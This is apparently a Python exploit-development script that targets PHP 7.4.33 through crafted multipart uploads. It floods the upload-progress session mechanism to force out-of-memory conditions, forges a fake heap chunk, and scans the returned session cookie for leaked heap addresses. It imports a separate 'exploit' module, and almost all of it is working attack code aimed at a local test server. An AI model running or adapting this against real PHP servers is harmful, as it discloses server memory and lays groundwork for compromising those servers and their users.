"""Test alternative OOM triggers on 7.4.33:
1. Header amplification (many large headers)
2. Empty file controls (many file uploads with empty content)
3. Nested field names (deeply nested arrays)
"""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

def test_header_amp(port, n_headers, header_mb, label):
    """Test header amplification: many large headers."""
    URL = f"http://127.0.0.1:{port}/"
    t = E.Target(URL, timeout=180.0, verbose=False)

    # Build multipart with many large headers
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    # Add many large headers (each header is a separate part)
    for i in range(n_headers):
        parts.append({"name": f"header{i:04d}", "data": b"H" * int(header_mb * 1024 * 1024)})
    total_mb = n_headers * header_mb
    print(f"  {label}: {n_headers} headers x {header_mb}MB = {total_mb:.0f}MB total", flush=True)

    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST1 ERROR: {e}", flush=True)
        return False
    time.sleep(0.5)

    # Check for OOM
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST2 ERROR: {e}", flush=True)
        return False
    raw = E.parse_cookie(r2)
    oom = len(raw) > 100
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk = c.most_common(1)[0][0] if c else 0
    tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
    chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
    print(f"    cookie={len(raw)}B{tag}{chunk_str}", flush=True)
    return oom

def test_empty_files(port, n_files, label):
    """Test empty file controls: many file uploads with empty content."""
    URL = f"http://127.0.0.1:{port}/"
    t = E.Target(URL, timeout=180.0, verbose=False)

    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    # Add many empty file uploads
    for i in range(n_files):
        parts.append({"name": f"file{i:04d}", "filename": f"empty{i:04d}.txt", "data": b""})
    print(f"  {label}: {n_files} empty files", flush=True)

    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST1 ERROR: {e}", flush=True)
        return False
    time.sleep(0.5)

    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST2 ERROR: {e}", flush=True)
        return False
    raw = E.parse_cookie(r2)
    oom = len(raw) > 100
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk = c.most_common(1)[0][0] if c else 0
    tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
    chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
    print(f"    cookie={len(raw)}B{tag}{chunk_str}", flush=True)
    return oom

print("=== Alternative OOM triggers on 7.4.33 ===", flush=True)

print("\n--- Header amplification ---", flush=True)
test_header_amp(18108, 10, 3, "7.4.33")
time.sleep(1)
test_header_amp(18108, 20, 2, "7.4.33")
time.sleep(1)
test_header_amp(18108, 5, 6, "7.4.33")
time.sleep(1)

print("\n--- Empty file controls ---", flush=True)
test_empty_files(18108, 1000, "7.4.33")
time.sleep(1)
test_empty_files(18108, 5000, "7.4.33")
time.sleep(1)
test_empty_files(18108, 10000, "7.4.33")
time.sleep(1)

print("\n=== done ===", flush=True)
